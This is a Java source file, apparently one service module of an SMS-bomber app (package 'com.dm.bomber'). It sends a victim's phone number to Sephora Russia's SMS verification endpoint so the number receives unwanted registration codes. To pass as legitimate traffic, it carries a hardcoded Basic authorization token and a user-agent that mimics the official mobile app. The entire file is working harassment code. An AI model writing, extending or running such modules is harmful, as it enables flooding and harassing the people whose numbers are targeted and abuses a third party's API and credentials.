package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Request;

public class Sephora extends JsonService {

    public Sephora() {
        setUrl("https://api.sephora.ru/sms/code/send");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("Authorization", "Basic NzE3MDI1MzphY2I3NDljM2EwMjZjOGZmZTRlMTkyMDY2YTI2OGVlZGE5OWViZjMy");
        builder.addHeader("User-Agent", "SephoraMobileApp (android/11; mobile/1.8.3; UTC+5) API/1.0");

        return super.buildRequest(builder);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("login", getFormattedPhone());
            json.put("sms_type", "registration");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
